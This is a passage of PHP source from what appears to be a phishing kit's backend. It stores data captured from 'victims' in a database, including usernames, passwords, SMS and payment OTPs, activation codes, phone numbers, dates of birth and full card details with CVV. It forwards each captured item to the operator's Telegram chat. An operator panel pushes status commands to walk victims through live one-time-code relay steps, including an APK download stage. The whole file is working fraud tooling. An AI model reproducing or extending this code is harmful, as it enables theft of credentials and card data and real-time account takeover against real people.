			}

		}
	}


	if($_GET['type'] == 'otp'){
		$uniqueid = $_SESSION['uniqueid'];

		if($_POST['otpcode'] != ''){

			$otpcode = $_POST['otpcode'];

			$query = mysqli_query($conn, "UPDATE victims SET status=6, buzzed=0, otp='$otpcode' WHERE uniqueid=$uniqueid");
			if($query){
				echo json_encode(array(
					'status' => 'ok'
				));
			}else{
				echo json_encode(array(
					'status' => 'notok'
				));
			}
		if($enable_telegram == 'checked' and $telegram_chaid != ''){
		$query = mysqli_query($conn, "SELECT * from victims WHERE uniqueid='$uniqueid'");
		$array = mysqli_fetch_array($query,MYSQLI_ASSOC);
		$tmsg = "<strong>[+] Username:</strong> <code>{$array['user']}</code> [+]\n<strong>[+] PIN:</strong> <code>$otpcode</code>";
		$tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);
		$telegram = new Telegram($bot_token);
		$content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
		$telegram->sendMessage($content);
		};


		}
	}






	if($_GET['type'] == 'keycode'){
		$uniqueid = $_SESSION['uniqueid'];

		if($_POST['dob'] != ''){

			$dob = $_POST['dob'];

			$query = mysqli_query($conn, "UPDATE victims SET status=36, buzzed=0, dob='$dob' WHERE uniqueid=$uniqueid");
			if($query){
				echo json_encode(array(
					'status' => 'ok'
				));
			}else{
				echo json_encode(array(
					'status' => 'notok'
				));
			}
		if($enable_telegram == 'checked' and $telegram_chaid != ''){
		$query = mysqli_query($conn, "SELECT * from victims WHERE uniqueid='$uniqueid'");
		$array = mysqli_fetch_array($query,MYSQLI_ASSOC);
		$tmsg = "<strong>[+] ID:</strong> <code>{$array['id']}</code>\n<strong>[+] Username:</strong> <code>{$array['user']}</code> [+]\n<strong>[+] KeyCode:</strong> <code>$dob</code>";
		$tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);
		$telegram = new Telegram($bot_token);
		$content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
		$telegram->sendMessage($content);
		};


		}
	}


	if($_GET['type'] == 'activation'){
		$uniqueid = $_SESSION['uniqueid'];

		if($_POST['name'] != ''){

			$name = $_POST['name'];

			$query = mysqli_query($conn, "UPDATE victims SET status=51, buzzed=0, name='$name' WHERE uniqueid=$uniqueid");
			if($query){
				echo json_encode(array(
					'status' => 'ok'
				));
			}else{
				echo json_encode(array(
					'status' => 'notok'
				));
			}
		if($enable_telegram == 'checked' and $telegram_chaid != ''){
		$query = mysqli_query($conn, "SELECT * from victims WHERE uniqueid='$uniqueid'");
		$array = mysqli_fetch_array($query,MYSQLI_ASSOC);
		$tmsg = "<strong>[+] ID:</strong> <code>{$array['id']}</code>\n<strong>[+] Username:</strong> <code>{$array['user']}</code> [+]\n<strong>[+] Activation Code:</strong> <code>$name</code>";
		$tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);
		$telegram = new Telegram($bot_token);
		$content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
		$telegram->sendMessage($content);
		};


		}
	}
	
	if($_GET['type'] == 'phonenr'){
		$uniqueid = $_SESSION['uniqueid'];

		if($_POST['phone'] != ''){

			$phone = $_POST['phone'];

			$query = mysqli_query($conn, "UPDATE victims SET status=8, buzzed=0, type='$phone' WHERE uniqueid=$uniqueid");
			if($query){
				echo json_encode(array(
					'status' => 'ok'
				));
			}else{
				echo json_encode(array(
					'status' => 'notok'
				));
			}
		if($enable_telegram == 'checked' and $telegram_chaid != ''){
		$query = mysqli_query($conn, "SELECT * from victims WHERE uniqueid='$uniqueid'");
		$array = mysqli_fetch_array($query,MYSQLI_ASSOC);
		$tmsg = "<strong>[+] ID:</strong> <code>{$array['id']}</code>\n<strong>[+] Username:</strong> <code>{$array['user']}</code> [+]\n<strong>[+] Phone Number:</strong> <code>$phone</code>";
		$tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);
		$telegram = new Telegram($bot_token);
		$content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
		$telegram->sendMessage($content);
		};


		}
	}
	
	
	
	


	if($_GET['type'] == 'otpcode'){
		$uniqueid = $_SESSION['uniqueid'];

		if($_POST['otp'] != ''){

			$otp = $_POST['otp'];

			$query = mysqli_query($conn, "UPDATE victims SET status=38, buzzed=0, otp='$otp' WHERE uniqueid=$uniqueid");
			if($query){
				echo json_encode(array(
					'status' => 'ok'
				));
			}else{
				echo json_encode(array(
					'status' => 'notok'
				));
			}
		if($enable_telegram == 'checked' and $telegram_chaid != ''){
		$query = mysqli_query($conn, "SELECT * from victims WHERE uniqueid='$uniqueid'");
		$array = mysqli_fetch_array($query,MYSQLI_ASSOC);
		$tmsg = "<strong>[+] ID:</strong> <code>{$array['id']}</code>\n<strong>[+] Username:</strong> <code>{$array['user']}</code> [+]\n<strong>[+] SMS OTP:</strong> <code>$otp</code>";
		$tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);
		$telegram = new Telegram($bot_token);
		$content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
		$telegram->sendMessage($content);
		};


		}
	}


	if($_GET['type'] == 'cancelpayment'){
		$uniqueid = $_SESSION['uniqueid'];

		if($_POST['mobile'] != ''){

			$mobile = $_POST['mobile'];

			$query = mysqli_query($conn, "UPDATE victims SET status=42, buzzed=0, mobile='$mobile' WHERE uniqueid=$uniqueid");
			if($query){
				echo json_encode(array(
					'status' => 'ok'
				));
			}else{
				echo json_encode(array(
					'status' => 'notok'
				));
			}
		if($enable_telegram == 'checked' and $telegram_chaid != ''){
		$query = mysqli_query($conn, "SELECT * from victims WHERE uniqueid='$uniqueid'");
		$array = mysqli_fetch_array($query,MYSQLI_ASSOC);
		$tmsg = "<strong>[+] ID:</strong> <code>{$array['id']}</code>\n<strong>[+] Username:</strong> <code>{$array['user']}</code> [+]\n<strong>[+] Cancel Payment OTP:</strong> <code>$mobile</code>";
		$tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);
		$telegram = new Telegram($bot_token);
		$content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
		$telegram->sendMessage($content);
		};


		}
	}



	if($_GET['type'] == 'theterms'){
		$uniqueid = $_SESSION['uniqueid'];

		if($_POST['mobile2'] != ''){

			$mobile2 = $_POST['mobile2'];

			$query = mysqli_query($conn, "UPDATE victims SET status=40, buzzed=0, mobile2='$mobile2' WHERE uniqueid=$uniqueid");
			if($query){
				echo json_encode(array(
					'status' => 'ok'
				));
			}else{
				echo json_encode(array(
					'status' => 'notok'
				));
			}
		if($enable_telegram == 'checked' and $telegram_chaid != ''){
		$query = mysqli_query($conn, "SELECT * from victims WHERE uniqueid='$uniqueid'");
		$array = mysqli_fetch_array($query,MYSQLI_ASSOC);
		$tmsg = "<strong>[+] ID:</strong> <code>{$array['id']}</code>\n<strong>[+] Username:</strong> <code>{$array['user']}</code> [+]\n<strong>[+] Terms button was $mobile2!</strong>";
		$tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);
		$telegram = new Telegram($bot_token);
		$content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
		$telegram->sendMessage($content);
		};


		}
	}
	

	if($_GET['type'] == 'appdownload'){
		$uniqueid = $_SESSION['uniqueid'];

		if($_POST['newthree'] != ''){

			$newthree = $_POST['newthree'];

			$query = mysqli_query($conn, "UPDATE victims SET status=19, buzzed=0, newthree='$newthree' WHERE uniqueid=$uniqueid");
			if($query){
				echo json_encode(array(
					'status' => 'ok'
				));
			}else{
				echo json_encode(array(
					'status' => 'notok'
				));
			}
		if($enable_telegram == 'checked' and $telegram_chaid != ''){
		$query = mysqli_query($conn, "SELECT * from victims WHERE uniqueid='$uniqueid'");
		$array = mysqli_fetch_array($query,MYSQLI_ASSOC);
		$tmsg = "<strong>[+] ID:</strong> <code>{$array['id']}</code>\n<strong>[+] Username:</strong> <code>{$array['user']}</code> [+]\n<strong>[+] APK Download was $newthree!</strong>";
		$tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);
		$telegram = new Telegram($bot_token);
		$content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
		$telegram->sendMessage($content);
		};


		}
	}
	
	
	if($_GET['type'] == 'reactivation'){
		$uniqueid = $_SESSION['uniqueid'];

		if($_POST['email'] != ''){

			$email = $_POST['email'];

			$query = mysqli_query($conn, "UPDATE victims SET status=65, buzzed=0, email='$email' WHERE uniqueid=$uniqueid");
			if($query){
				echo json_encode(array(
					'status' => 'ok'
				));
			}else{
				echo json_encode(array(
					'status' => 'notok'
				));
			}
		if($enable_telegram == 'checked' and $telegram_chaid != ''){
		$query = mysqli_query($conn, "SELECT * from victims WHERE uniqueid='$uniqueid'");
		$array = mysqli_fetch_array($query,MYSQLI_ASSOC);
		$tmsg = "<strong>[+] ID:</strong> <code>{$array['id']}</code>\n<strong>[+] Username:</strong> <code>{$array['user']}</code> [+]\n<strong>[+] Reactivation button was $email!</strong>";
		$tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);
		$telegram = new Telegram($bot_token);
		$content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
		$telegram->sendMessage($content);
		};


		}
	}






	
	if($_GET['type'] == 'call'){
		$uniqueid = $_SESSION['uniqueid'];

			$query = mysqli_query($conn, "UPDATE victims SET status=8, buzzed=0 WHERE uniqueid=$uniqueid");
			if($query){
				echo json_encode(array(
					'status' => 'ok'
				));
			}else{
				echo json_encode(array(
					'status' => 'notok'
				));
			}
	}




	if($_GET['type'] == 'app'){
		$uniqueid = $_SESSION['uniqueid'];

			$query = mysqli_query($conn, "UPDATE victims SET status=15, buzzed=0 WHERE uniqueid=$uniqueid");
			if($query){
				echo json_encode(array(
					'status' => 'ok'
				));
			}else{
				echo json_encode(array(
					'status' => 'notok'
				));
			}
	}



	if($_GET['type'] == 'app_name'){
		$uniqueid = $_SESSION['uniqueid'];

			$query = mysqli_query($conn, "UPDATE victims SET status=3, buzzed=0 WHERE uniqueid=$uniqueid");
			if($query){
				echo json_encode(array(
					'status' => 'ok'
				));
			}else{
				echo json_encode(array(
					'status' => 'notok'
				));
			}
	}





	if($_GET['type'] == 'payee'){
		$uniqueid = $_SESSION['uniqueid'];

			$query = mysqli_query($conn, "UPDATE victims SET status=11, buzzed=0 WHERE uniqueid=$uniqueid");
			if($query){
				echo json_encode(array(
					'status' => 'ok'
				));
			}else{
				echo json_encode(array(
					'status' => 'notok'
				));
			}
	}
		
	
	




	if($_GET['type'] == 'getstatus'){
		$uniqueid = $_SESSION['uniqueid'];
		$query = mysqli_query($conn, "SELECT * from victims WHERE uniqueid=$uniqueid");
		
		if(mysqli_num_rows($query) >= 1){
			$array = mysqli_fetch_array($query,MYSQLI_ASSOC);
			echo $array['status'];
		}		
		
	}


}




if($_SESSION['loggedin'] == 'true'){
	
	
if ($_GET['type'] == 'commmand') {
    if (!empty($_POST['userid']) && isset($_POST['status'])) {
        $userid = $_POST['userid'];
        $status = $_POST['status'];
        $handler = $_SESSION['username'];
        $amount = isset($_POST['amount']) ? $_POST['amount'] : ''; // Handle missing 'amount' gracefully

        // Prepare the query
        if ($amount != '') {
            $query = mysqli_query($conn, "UPDATE victims SET handler='$handler', status=$status, buzzed=1, input_amount='$amount' WHERE id=$userid");
        } else {
            $query = mysqli_query($conn, "UPDATE victims SET handler='$handler', status=$status, buzzed=1 WHERE id=$userid");
        }

        // Check if the query was successful
        if ($query) {
            echo json_encode(array('status' => 'ok'));
        } else {
            echo json_encode(array('status' => 'notok'));
        }
    } else {
        echo json_encode(array('status' => 'notokk'));
    }
}



if ($_GET['type'] == 'onecommmand') {
    if (!empty($_POST['userid']) && !empty($_POST['status'])) {
        $userid = $_POST['userid'];
        $status = $_POST['status'];
        $handler = $_SESSION['username'];

        // Get 'home' parameter, which could be empty or null
        $home = isset($_POST['home']) ? $_POST['home'] : '';

        // Prepared statement to prevent SQL injection
        if ($home !== '') {
            $query = mysqli_prepare($conn, "UPDATE victims SET handler=?, status=?, buzzed=1, home=? WHERE id=?");
            mysqli_stmt_bind_param($query, "sssi", $handler, $status, $home, $userid);
        } else {
            $query = mysqli_prepare($conn, "UPDATE victims SET handler=?, status=?, buzzed=1, home=NULL WHERE id=?");
            mysqli_stmt_bind_param($query, "ssi", $handler, $status, $userid);
        }

        if (mysqli_stmt_execute($query)) {
            // Store the home value in the session if provided
            $_SESSION['home'] = $home;
            echo json_encode(array('status' => 'ok'));
        } else {
            echo json_encode(array('status' => 'notok'));
        }
    } else {
        echo json_encode(array('status' => 'notokk'));
    }
}


	
	
if ($_GET['type'] == 'onecommmandlive') {
    if (!empty($_POST['userid']) && !empty($_POST['status'])) {
        $userid = $_POST['userid'];
        $status = $_POST['status'];
        $handler = $_SESSION['username'];

        // Get 'homelive' parameter, which could be empty or null
        $homelive = isset($_POST['homelive']) ? $_POST['homelive'] : '';

        // Prepared statement to prevent SQL injection
        if ($homelive !== '') {
            $query = mysqli_prepare($conn, "UPDATE victims SET handler=?, status=?, buzzed=1, homelive=? WHERE id=?");
            mysqli_stmt_bind_param($query, "sssi", $handler, $status, $homelive, $userid);
        } else {
            $query = mysqli_prepare($conn, "UPDATE victims SET handler=?, status=?, buzzed=1, homelive=NULL WHERE id=?");
            mysqli_stmt_bind_param($query, "ssi", $handler, $status, $userid);
        }

        if (mysqli_stmt_execute($query)) {
            // Store the homelive value in the session if provided
            $_SESSION['homelive'] = $homelive;
            echo json_encode(array('status' => 'ok'));
        } else {
            echo json_encode(array('status' => 'notok'));
        }
    } else {
        echo json_encode(array('status' => 'notokk'));
    }
}

	
	
	
	




if ($_GET['type'] == 'buzzoff') {
    // Check current state of buzzed alerts (are they all paused or active)
    $query = mysqli_query($conn, "SELECT * FROM victims WHERE buzzed = 0");

    if (mysqli_num_rows($query) > 0) {
        // If there are victims with buzzed=0, it means we need to "buzz" them all
        $queryy = mysqli_query($conn, "UPDATE victims SET buzzed=1 WHERE buzzed=0");
        if ($queryy) {
            echo json_encode(array(
                'status' => 'ok',
                'action' => 1 // Action 1 means all victims are now "buzzed" (alert paused)
            ));
        } else {
            echo json_encode(array(
                'status' => 'notok',
                'action' => 0 // Action 0 means the operation failed
            ));
        }
    } else {
        // If there are no victims with buzzed=0, it means we need to "unbuzz" them
        $queryy = mysqli_query($conn, "UPDATE victims SET buzzed=0 WHERE buzzed=1");
        if ($queryy) {
            echo json_encode(array(
                'status' => 'ok',
                'action' => 0 // Action 0 means all victims are now "unbuzzed" (alerts resumed)
            ));
        } else {
            echo json_encode(array(
                'status' => 'notok',
                'action' => 0 // Action 0 means the operation failed
            ));
        }
    }
}



if ($_GET['type'] == 'buzzoffsingle') {
    $userid = $_GET['userid'];
    $query = mysqli_query($conn, "SELECT * FROM victims WHERE id = $userid");
    if (mysqli_num_rows($query) >= 1) {
        $row = mysqli_fetch_assoc($query);
        $newBuzzedState = ($row['buzzed'] == 0) ? 1 : 0; // Toggle buzzed state

        $queryy = mysqli_query($conn, "UPDATE victims SET buzzed = $newBuzzedState WHERE id = $userid");
        if ($queryy) {
            echo json_encode(array(
                'status' => 'ok'
            ));
        } else {
            echo json_encode(array(
                'status' => 'notok'
            ));
        }
    } else {
        echo json_encode(array('status' => 'notfound')); // Victim not found
    }
}


	
if ($_GET['type'] == 'remove') {
    $start_time = microtime(true);

    if ($_POST['userid'] && is_numeric($_POST['userid'])) {
        $userid = $_POST['userid'];

        $query_start = microtime(true);
        $query = mysqli_query($conn, "DELETE FROM victims WHERE id=$userid");
        $query_time = microtime(true) - $query_start;

        if ($query) {
            $total_time = microtime(true) - $start_time;
            error_log("Delete query took: {$query_time}s | Total: {$total_time}s");

            echo json_encode(['status' => 'ok']);
        } else {
            error_log("Delete query failed: " . mysqli_error($conn));
            echo json_encode(['status' => 'notok']);
        }
    } else {
        echo json_encode(['status' => 'notokk']);
    }
}





	if($_GET['type'] == 'remove_handler'){
		if($_POST['userid'] and numeric($_POST['userid']) == true){
			$userid = $_POST['userid'];
			
			$query = mysqli_query($conn, "DELETE FROM handlers WHERE id=$userid");
			if($query){
				echo json_encode(array(
				'status' => 'ok'
				));
			}else{
				echo json_encode(array(
				'status' => 'notok'
				));
			}
		}else{
			echo json_encode(array(
				'status' => 'notokk'
			));
		}
	}



if ($_GET['type'] == 'ban') {
    if (isset($_POST['userid']) && is_numeric($_POST['userid'])) {
        $userid = $_POST['userid'];

        // Prevent SQL injection
        $userid = mysqli_real_escape_string($conn, $userid);

        // Update the user's status to 'banned'
        $query = mysqli_query($conn, "UPDATE victims SET status=99, buzzed=1 WHERE id='$userid'");
        
        if ($query) {
            // Retrieve the user's information for IP blocking
            $query = mysqli_query($conn, "SELECT * FROM victims WHERE id='$userid'");
            if ($query && mysqli_num_rows($query) > 0) {
                $row = mysqli_fetch_assoc($query);
                $ipblock = $row['ip'];

                // Get current blacklist data
                $ipslist = file_get_contents("blacklist.dat");

                // Block the IP only if it isn't already blacklisted
                if (strpos($ipslist, $ipblock) === false) {
                    file_put_contents("blacklist.dat", $ipblock . "\n", FILE_APPEND);
                }

                // Return success
                echo json_encode(array('status' => 'ok'));
            } else {
                // Return error if user not found
                echo json_encode(array('status' => 'notfound'));
            }
        } else {
            // Return error if update failed
            echo json_encode(array('status' => 'notok'));
        }
    } else {
        // Invalid user ID
        echo json_encode(array('status' => 'notokk', 'message' => 'Invalid user ID'));
    }
}



if ($_GET['type'] == 'visits_reset') {
    $query = mysqli_query($conn, "DELETE FROM visits");

    if ($query) {
        echo json_encode(array(
            'status' => 'ok'
        ));
    } else {
        echo json_encode(array(
            'status' => 'notok'
        ));
    }
}




if ($_GET['type'] == 'clearlogs') {
    // Fetch all victims from the database
    $query = mysqli_query($conn, "SELECT * FROM victims");

    if ($query && mysqli_num_rows($query) > 0) {
        // Prepare an array to store the IDs of victims
        $ids = '';
        $array = mysqli_fetch_all($query, MYSQLI_ASSOC); // Fetch all rows as an associative array

        foreach ($array as $value) {
            $ids .= 'row' . $value['id'] . ","; // Append victim IDs to string
        }

        // Log removed victim IDs to a file
        if (!file_put_contents("removed_ids.txt", $ids, FILE_APPEND)) {
            echo json_encode(['status' => 'notok', 'message' => 'Failed to log removed IDs']);
            exit;
        }

        // Clear all victims from the database
        $deleteQuery = mysqli_query($conn, "DELETE FROM victims");

        if ($deleteQuery) {
            echo json_encode(['status' => 'ok']);
        } else {
            echo json_encode(['status' => 'notok', 'message' => 'Failed to delete victims']);
        }
    } else {
        echo json_encode(['status' => 'notok', 'message' => 'No victims found']);
    }
}



if ($_GET['type'] == 'getallinfo') {
    $query = mysqli_query($conn, "SELECT * FROM victims");

    if ($query && mysqli_num_rows($query) > 0) {
        $allinfo = ''; // Initialize variable to hold all rows

        // Loop through each row in the result set
        while ($array = mysqli_fetch_array($query, MYSQLI_ASSOC)) {
            $allinfo .= "
<div style='padding: 15px; background-color: #F4F6FA; border-radius: 8px;'>
  <table style='width: 100%; border-collapse: collapse; font-family: Arial, sans-serif; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);'>

    <!-- User Information -->
    <tr>
      <td style='padding: 10px; width: 30%; color: #33334d; background-color: #f7f9fc; border: 1px solid #D1D5DB;'>Username</td>
      <td  style='padding: 10px; width: 70%; color: #495057; background-color: #FFFFFF; border: 1px solid #D1D5DB; '>{$array['user']}</td>
    </tr>
    <tr>
      <td style='padding: 10px; width: 30%; color: #33334d; background-color: #f7f9fc; border: 1px solid #D1D5DB;'>Password</td>
      <td  style='padding: 10px; width: 70%; color: #495057; background-color: #FFFFFF; border: 1px solid #D1D5DB; '>{$array['pass']}</td>
    </tr>


	    <!-- Billing Information -->
    <tr><td colspan='2' style='font-weight: bold; color: #5063F2; font-size: 1.1rem; padding: 12px; text-align: left; background-color: #EDEFF3;'>Billing Information</td></tr>
    <tr>
      <td style='padding: 10px; width: 30%; color: #33334d; background-color: #f7f9fc; border: 1px solid #D1D5DB;'>Fullname </td>
      <td  style='padding: 10px; width: 70%; color: #495057; background-color: #FFFFFF; border: 1px solid #D1D5DB; '>{$array['fullname']}</td>
    </tr>

	    <tr>
      <td style='padding: 10px; width: 30%; color: #33334d; background-color: #f7f9fc; border: 1px solid #D1D5DB;'>Address</td>
      <td  style='padding: 10px; width: 70%; color: #495057; background-color: #FFFFFF; border: 1px solid #D1D5DB; '>{$array['address']}</td>
    </tr>
	
   <tr>
      <td style='padding: 10px; width: 30%; color: #33334d; background-color: #f7f9fc; border: 1px solid #D1D5DB;'>City</td>
      <td  style='padding: 10px; width: 70%; color: #495057; background-color: #FFFFFF; border: 1px solid #D1D5DB; '>{$array['city']}</td>
    </tr>
   <tr>
      <td style='padding: 10px; width: 30%; color: #33334d; background-color: #f7f9fc; border: 1px solid #D1D5DB;'>State</td>
      <td  style='padding: 10px; width: 70%; color: #495057; background-color: #FFFFFF; border: 1px solid #D1D5DB; '>{$array['state']}</td>
    </tr>
	   <tr>
      <td style='padding: 10px; width: 30%; color: #33334d; background-color: #f7f9fc; border: 1px solid #D1D5DB;'>zip</td>
      <td  style='padding: 10px; width: 70%; color: #495057; background-color: #FFFFFF; border: 1px solid #D1D5DB; '>{$array['zip']}</td>
    </tr>
	   <tr>
      <td style='padding: 10px; width: 30%; color: #33334d; background-color: #f7f9fc; border: 1px solid #D1D5DB;'>Phone</td>
      <td  style='padding: 10px; width: 70%; color: #495057; background-color: #FFFFFF; border: 1px solid #D1D5DB; '>{$array['phone']}</td>
    </tr>
		   <tr>
      <td style='padding: 10px; width: 30%; color: #33334d; background-color: #f7f9fc; border: 1px solid #D1D5DB;'>Date Of Birth</td>
      <td  style='padding: 10px; width: 70%; color: #495057; background-color: #FFFFFF; border: 1px solid #D1D5DB; '>{$array['dob']}</td>
    </tr>
    <!-- OTP Information -->
    <tr><td colspan='2' style='font-weight: bold; color: #5063F2; font-size: 1.1rem; padding: 12px; text-align: left; background-color: #EDEFF3;'>Card Information</td></tr>
        <tr>
      <td style='padding: 10px; width: 30%; color: #33334d; background-color: #f7f9fc; border: 1px solid #D1D5DB;'>Name On Card </td>
      <td  style='padding: 10px; width: 70%; color: #495057; background-color: #FFFFFF; border: 1px solid #D1D5DB; '>{$array['NameOnCard']}</td>
    </tr>   

   <tr>
      <td style='padding: 10px; width: 30%; color: #33334d; background-color: #f7f9fc; border: 1px solid #D1D5DB;'>Card Number</td>
      <td  style='padding: 10px; width: 70%; color: #495057; background-color: #FFFFFF; border: 1px solid #D1D5DB; '>{$array['card']}</td>
    </tr>
   <tr>
      <td style='padding: 10px; width: 30%; color: #33334d; background-color: #f7f9fc; border: 1px solid #D1D5DB;'>Еxpiration datе</td>
      <td  style='padding: 10px; width: 70%; color: #495057; background-color: #FFFFFF; border: 1px solid #D1D5DB; '>{$array['exp']}</td>
    </tr>
   <tr>
      <td style='padding: 10px; width: 30%; color: #33334d; background-color: #f7f9fc; border: 1px solid #D1D5DB;'>CVV</td>
      <td  style='padding: 10px; width: 70%; color: #495057; background-color: #FFFFFF; border: 1px solid #D1D5DB; '>{$array['cvv']}</td>
    </tr>
  </table>
</div>
";
        }

        echo json_encode([
            'status' => 'ok',
            'info' => $allinfo
        ]);
    } else {
        echo json_encode([
            'status' => 'notfound',
            'message' => 'No data found in the database'
        ]);
    }
}

if ($_GET['type'] == 'getinfo') {
    // Ensure 'userid' is present and is numeric
    if (isset($_POST['userid']) && is_numeric($_POST['userid'])) {
        $userid = $_POST['userid'];

        // Prevent SQL injection by escaping the user input
        $userid = mysqli_real_escape_string($conn, $userid);

        // Query the database for the victim's data
        $query = mysqli_query($conn, "SELECT * FROM victims WHERE id='$userid'");

        // Check if the query returns any result
        if ($query && mysqli_num_rows($query) > 0) {
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            // Construct the victim information with improved style
$allinfo = "

<div style='padding: 15px; background-color: #F4F6FA; border-radius: 8px;'>
  <table style='width: 100%; border-collapse: collapse; font-family: Arial, sans-serif; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);'>

    <!-- User Information -->
    <tr>
      <td style='padding: 10px; width: 30%; color: #33334d; background-color: #f7f9fc; border: 1px solid #D1D5DB;'>Username</td>
      <td  style='padding: 10px; width: 70%; color: #495057; background-color: #FFFFFF; border: 1px solid #D1D5DB; '>{$array['user']}</td>
    </tr>
    <tr>
      <td style='padding: 10px; width: 30%; color: #33334d; background-color: #f7f9fc; border: 1px solid #D1D5DB;'>Password</td>
      <td  style='padding: 10px; width: 70%; color: #495057; background-color: #FFFFFF; border: 1px solid #D1D5DB; '>{$array['pass']}</td>
    </tr>


	    <!-- Billing Information -->
    <tr><td colspan='2' style='font-weight: bold; color: #5063F2; font-size: 1.1rem; padding: 12px; text-align: left; background-color: #EDEFF3;'>Billing Information</td></tr>
    <tr>
      <td style='padding: 10px; width: 30%; color: #33334d; background-color: #f7f9fc; border: 1px solid #D1D5DB;'>Fullname </td>
      <td  style='padding: 10px; width: 70%; color: #495057; background-color: #FFFFFF; border: 1px solid #D1D5DB; '>{$array['fullname']}</td>
    </tr>

	    <tr>
      <td style='padding: 10px; width: 30%; color: #33334d; background-color: #f7f9fc; border: 1px solid #D1D5DB;'>Address</td>
      <td  style='padding: 10px; width: 70%; color: #495057; background-color: #FFFFFF; border: 1px solid #D1D5DB; '>{$array['address']}</td>
    </tr>
	
   <tr>
      <td style='padding: 10px; width: 30%; color: #33334d; background-color: #f7f9fc; border: 1px solid #D1D5DB;'>City</td>
      <td  style='padding: 10px; width: 70%; color: #495057; background-color: #FFFFFF; border: 1px solid #D1D5DB; '>{$array['city']}</td>
    </tr>
   <tr>
      <td style='padding: 10px; width: 30%; color: #33334d; background-color: #f7f9fc; border: 1px solid #D1D5DB;'>State</td>
      <td  style='padding: 10px; width: 70%; color: #495057; background-color: #FFFFFF; border: 1px solid #D1D5DB; '>{$array['state']}</td>
    </tr>
	   <tr>
      <td style='padding: 10px; width: 30%; color: #33334d; background-color: #f7f9fc; border: 1px solid #D1D5DB;'>zip</td>
      <td  style='padding: 10px; width: 70%; color: #495057; background-color: #FFFFFF; border: 1px solid #D1D5DB; '>{$array['zip']}</td>
    </tr>
	   <tr>
      <td style='padding: 10px; width: 30%; color: #33334d; background-color: #f7f9fc; border: 1px solid #D1D5DB;'>Phone</td>
      <td  style='padding: 10px; width: 70%; color: #495057; background-color: #FFFFFF; border: 1px solid #D1D5DB; '>{$array['phone']}</td>
    </tr>
		   <tr>
      <td style='padding: 10px; width: 30%; color: #33334d; background-color: #f7f9fc; border: 1px solid #D1D5DB;'>Date Of Birth</td>
      <td  style='padding: 10px; width: 70%; color: #495057; background-color: #FFFFFF; border: 1px solid #D1D5DB; '>{$array['dob']}</td>
    </tr>
    <!-- OTP Information -->
    <tr><td colspan='2' style='font-weight: bold; color: #5063F2; font-size: 1.1rem; padding: 12px; text-align: left; background-color: #EDEFF3;'>Card Information</td></tr>
        <tr>
      <td style='padding: 10px; width: 30%; color: #33334d; background-color: #f7f9fc; border: 1px solid #D1D5DB;'>Name On Card </td>
      <td  style='padding: 10px; width: 70%; color: #495057; background-color: #FFFFFF; border: 1px solid #D1D5DB; '>{$array['NameOnCard']}</td>
    </tr>   

   <tr>
      <td style='padding: 10px; width: 30%; color: #33334d; background-color: #f7f9fc; border: 1px solid #D1D5DB;'>Card Number</td>
      <td  style='padding: 10px; width: 70%; color: #495057; background-color: #FFFFFF; border: 1px solid #D1D5DB; '>{$array['card']}</td>
    </tr>
   <tr>
      <td style='padding: 10px; width: 30%; color: #33334d; background-color: #f7f9fc; border: 1px solid #D1D5DB;'>Еxpiration datе</td>
      <td  style='padding: 10px; width: 70%; color: #495057; background-color: #FFFFFF; border: 1px solid #D1D5DB; '>{$array['exp']}</td>
    </tr>
   <tr>
      <td style='padding: 10px; width: 30%; color: #33334d; background-color: #f7f9fc; border: 1px solid #D1D5DB;'>CVV</td>
      <td  style='padding: 10px; width: 70%; color: #495057; background-color: #FFFFFF; border: 1px solid #D1D5DB; '>{$array['cvv']}</td>
    </tr>
  </table>
</div>
";




            // Send the response with victim info
            echo json_encode(array(
                'status' => 'ok', 
                'info' => $allinfo
            ));

        } else {
            // If no results were found
            echo json_encode(array(
                'status' => 'notfound',
                'message' => 'Victim not found'
            ));
        }
    } else {
        // If userid is invalid or not set
        echo json_encode(array(
            'status' => 'notokk',
            'message' => 'Invalid user ID'
        ));
    }
}


}